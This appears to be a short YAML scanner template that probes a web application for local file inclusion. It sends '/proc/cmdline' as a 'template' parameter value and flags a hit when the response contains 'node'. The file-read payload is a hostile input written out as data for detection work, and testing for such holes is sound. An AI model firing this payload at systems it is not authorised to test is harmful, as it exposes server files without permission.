id: lfi6-0580
name: 'Traversal in template'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via template'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - '/proc/cmdline'
    matchers:
      - type: word
        part: body
        words:
          - 'node'
